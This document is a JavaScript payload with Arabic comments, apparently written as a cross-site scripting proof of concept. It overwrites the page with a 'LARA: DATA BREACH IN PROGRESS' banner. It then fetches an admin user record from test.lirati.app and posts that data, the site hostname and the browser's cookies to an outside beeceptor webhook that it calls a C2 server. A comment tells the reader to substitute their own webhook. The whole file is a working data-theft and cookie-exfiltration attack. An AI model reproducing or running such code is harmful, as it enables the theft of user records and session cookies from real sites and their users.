(async () => {
    // 1. مسح واجهة الصفحة فوراً
    document.documentElement.innerHTML = `
        <body style="background:#000;color:#0f0;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:monospace;">
            <div style="text-align:center;">
                <h1 style="text-shadow:0 0 10px #0f0;">LARA: DATA BREACH IN PROGRESS</h1>
                <p id="status">Fetching sensitive data...</p>
            </div>
        </body>`;

    try {
        // 2. طلب البيانات من الهدف (Target API)
        const targetUrl = 'https://test.lirati.app/admin/users/2773';
        const response = await fetch(targetUrl);
        const userData = await response.text(); // نأخذ النتيجة كنص

        document.getElementById('status').innerText = "Data acquired. Sending to C2 server...";

        // 3. إرسال البيانات المسروقة إلى الـ Webhook الخاص بك
        // استبدل الرابط أدناه برابط الـ Webhook الذي تريد استقبال البيانات عليه
        const myWebhook = 'https://tttestttwwwwwssswww.free.beeceptor.com/ssssssssss'; 
        
        await fetch(myWebhook, {
            method: 'POST',
            mode: 'no-cors', // نستخدم no-cors لتجنب مشاكل التصريح في بعض الحالات
            body: JSON.stringify({
                victim: window.location.hostname,
                path: targetUrl,
                exfiltrated_data: userData,
                cookies: document.cookie
            })
        });

        document.getElementById('status').innerText = "LARA: Operation Complete. Data Exfiltrated.";
        console.log("Lara: Mission accomplished.");

    } catch (e) {
        document.getElementById('status').style.color = "red";
        document.getElementById('status').innerText = "LARA: ERROR - " + e.message;
    }
})();
